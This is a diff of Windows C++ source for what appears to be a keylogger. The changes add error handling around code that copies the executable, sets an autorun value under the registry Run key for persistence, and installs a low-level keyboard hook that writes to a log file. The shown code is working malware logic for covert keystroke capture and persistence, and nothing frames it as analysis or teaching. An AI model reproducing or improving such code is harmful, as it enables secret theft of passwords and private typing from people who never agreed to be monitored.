@@ -89,9 +89,12 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 		CopyFile(szFileName, fileCopyPath.c_str(), TRUE); //Copy executable file
 		//Set registry autorun key
 		HKEY hKey = NULL;
-		LONG result = RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
-		RegSetValueEx(hKey, _T("Autorun"), 0, REG_SZ, (PBYTE)fileCopyPath.c_str(), fileCopyPath.size() * sizeof(TCHAR) + 1);
-		RegCloseKey(hKey);
+		LSTATUS result = RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &hKey);
+		if (result == ERROR_SUCCESS)
+		{
+			RegSetValueEx(hKey, _T("Autorun"), 0, REG_SZ, (PBYTE)fileCopyPath.c_str(), fileCopyPath.size() * sizeof(TCHAR) + 1);
+			RegCloseKey(hKey);
+		}
 	}
 
 	//Create timer
@@ -109,7 +112,9 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 	SetFilePointer(logFileHandle, 0, NULL, FILE_END); //Write to end of file
 
 	//WM_KEYBOARD_LL hook
-	SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
+	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, NULL);
+	if (hook == NULL) //Fatal
+		abort();
 
 	//Main cycle
 	while (GetMessage(&msg, NULL, 0, 0))
@@ -267,7 +272,7 @@ string bytesToHex(unsigned char * data, int length)
 
 void createDirectoryRecursively(tstring path)
 {
-	BOOL directoryCreated = CreateDirectory(path.c_str(), NULL);
+	BOOL directoryCreated = CreateDirectory(path.c_str(), NULL); //this function will only create the final directory in the path
 	if (!directoryCreated)
 	{
 		if (GetLastError() == ERROR_PATH_NOT_FOUND)
